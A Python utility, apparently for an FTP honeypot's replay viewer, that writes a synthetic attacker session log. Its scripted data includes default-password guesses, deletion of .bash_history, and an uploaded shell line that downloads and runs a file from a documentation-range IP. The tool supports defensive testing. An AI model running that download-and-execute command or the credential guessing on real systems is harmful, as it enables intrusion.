#!/usr/bin/env python3
# Synthesize a realistic ~60s FTP attacker session into logs/ftp_session_<ip>_<HHMMSS>.log.
# Used to give the replay viewer substantive data when no real attacker has hit the box.
#
# usage:
#   python3 tools/synth_ftp_session.py                          # default IP 198.51.100.42, ~60s
#   python3 tools/synth_ftp_session.py --ip 203.0.113.7 --seconds 90
#   python3 tools/synth_ftp_session.py --out-dir /tmp/logs       # write somewhere else

import argparse
import os
import random
from datetime import datetime, timedelta
from pathlib import Path

# Story beats — (delay_after_prev_seconds, kind, text). Renders attacker-realistic.
# Anonymous probe → cred brute → recon → upload payload → cleanup → bail.
SCRIPT = [
    (0.00, "SERVER", "220 ProFTPD 1.3.5e Server (NetWatch) [::ffff:127.0.0.1]"),
    (1.20, "CLIENT", "USER anonymous"),
    (0.05, "SERVER", "331 Anonymous login ok, send your complete email address as your password"),
    (2.10, "CLIENT", "PASS guest@example.com"),
    (0.08, "SERVER", "530 Login incorrect."),
    (3.40, "CLIENT", "USER admin"),
    (0.06, "SERVER", "331 Password required for admin"),
    (1.50, "CLIENT", "PASS admin"),
    (0.09, "CRED", "admin:admin"),
    (0.04, "SERVER", "530 Login incorrect."),
    (2.20, "CLIENT", "USER admin"),
    (0.05, "SERVER", "331 Password required for admin"),
    (1.30, "CLIENT", "PASS password123"),
    (0.07, "CRED", "admin:password123"),
    (0.05, "SERVER", "530 Login incorrect."),
    (1.90, "CLIENT", "USER root"),
    (0.06, "SERVER", "331 Password required for root"),
    (1.10, "CLIENT", "PASS toor"),
    (0.07, "CRED", "root:toor"),
    (0.04, "SERVER", "230 User root logged in"),
    (2.80, "CLIENT", "SYST"),
    (0.05, "SERVER", "215 UNIX Type: L8"),
    (1.20, "CLIENT", "FEAT"),
    (0.05, "SERVER", "211-Features:\\n MDTM\\n MFMT\\n LANG en-US.UTF-8\\n REST STREAM\\n SIZE\\n211 End"),
    (1.40, "CLIENT", "PWD"),
    (0.05, "SERVER", '257 "/" is the current directory'),
    (1.80, "CLIENT", "TYPE I"),
    (0.05, "SERVER", "200 Type set to I"),
    (1.30, "CLIENT", "PASV"),
    (0.06, "PASV",   "192,0,2,42,201,17"),
    (0.05, "SERVER", "227 Entering Passive Mode (192,0,2,42,201,17)."),
    (1.20, "CLIENT", "LIST"),
    (0.10, "SERVER", "150 Opening BINARY mode data connection for LIST"),
    (0.80, "DATA_SEND", "drwxr-xr-x  2 root root  4096 Jun  2 10:21 backups"),
    (0.02, "DATA_SEND", "-rw-r--r--  1 root root   154 Jun  2 10:21 .bash_history"),
    (0.02, "DATA_SEND", "-rw-------  1 root root  1843 Jun  2 10:21 .ssh"),
    (0.06, "SERVER", "226 Transfer complete"),
    (3.50, "CLIENT", "CWD backups"),
    (0.05, "SERVER", "250 CWD command successful"),
    (1.40, "CLIENT", "PASV"),
    (0.06, "PASV",   "192,0,2,42,201,33"),
    (0.05, "SERVER", "227 Entering Passive Mode (192,0,2,42,201,33)."),
    (1.20, "CLIENT", "STOR x.sh"),
    (0.08, "SERVER", "150 Opening BINARY mode data connection for x.sh"),
    (1.60, "DATA_RECV", "#!/bin/sh\\nwget http://198.51.100.42:8080/m -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m &"),
    (0.10, "UPLOAD_SAVED", "x.sh size=98 sha256=4f1c…d0a2"),
    (0.05, "SERVER", "226 Transfer complete"),
    (4.20, "CLIENT", "DELE .bash_history"),
    (0.05, "SERVER", "250 DELE command successful"),
    (1.10, "CLIENT", "QUIT"),
    (0.04, "SERVER", "221 Goodbye."),
    (0.02, "SESSION_END", "client closed connection cleanly"),
]


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--ip", default="198.51.100.42",
                   help="attacker IP for session id and log filename (RFC5737 TEST-NET-2 default)")
    p.add_argument("--seconds", type=float, default=60.0,
                   help="target duration; script is time-scaled to roughly match")
    p.add_argument("--out-dir", default=None,
                   help="output directory (default: ./logs relative to repo root)")
    p.add_argument("--start", default=None,
                   help='session start time HH:MM:SS (default: now)')
    args = p.parse_args()

    base = Path(__file__).resolve().parent.parent
    out_dir = Path(args.out_dir) if args.out_dir else base / "logs"
    out_dir.mkdir(parents=True, exist_ok=True)

    raw_total = sum(d for d, _, _ in SCRIPT)
    scale = args.seconds / raw_total if raw_total > 0 else 1.0

    if args.start:
        h, m, s = [int(x) for x in args.start.split(":")]
        start = datetime.now().replace(hour=h, minute=m, second=s, microsecond=0)
    else:
        start = datetime.now()

    sid = f"{args.ip}_{start.strftime('%H%M%S')}"
    out_path = out_dir / f"ftp_session_{sid}.log"

    if out_path.exists():
        print(f"refusing to overwrite existing {out_path}")
        return

    lines = []
    t = start
    for delay, kind, text in SCRIPT:
        # tiny jitter so it doesn't look too clockwork
        d = max(0.0, delay * scale + random.uniform(-0.04, 0.04))
        t += timedelta(seconds=d)
        ts = t.strftime("%H:%M:%S") + f".{int(t.microsecond/1000):03d}"
        lines.append(f"[{ts}] {kind}: {text}")

    out_path.write_text("\n".join(lines) + "\n")
    print(f"wrote {out_path}")
    print(f"session_id: {sid}")
    print(f"open: http://127.0.0.1:9090/replay/{sid}?proto=ftp")


if __name__ == "__main__":
    main()
